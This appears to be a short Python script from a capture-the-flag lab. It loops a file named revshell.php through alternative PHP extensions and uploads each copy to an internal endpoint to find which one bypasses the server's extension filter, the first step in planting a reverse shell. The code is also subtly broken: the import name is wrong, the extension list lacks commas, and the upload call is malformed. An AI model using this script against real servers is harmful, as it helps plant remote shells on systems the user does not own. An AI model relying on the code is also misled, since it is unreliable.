import request
import os
ip = "10.10.121.5"
url = f"http://10.10.121.5:3333/internal/"
old_filename = "revshell.php"
filename = "revshell"
extension = [
    ".php"
    ".php3"
    ".php4"
    ".php5"
    ".phptml"

]
for ext in extension:
    new_filename = filename + ext
    os.rename(old_filename, new_filename)

    files = {"file": open(new_filename, "rb")}
    r = request.post(url, files)

    if "Extension not alowed" in r.text:
        print(f"{ext}not allowed")
    else:
        print(f"{ext}allowed")

    old_filename = new_filename
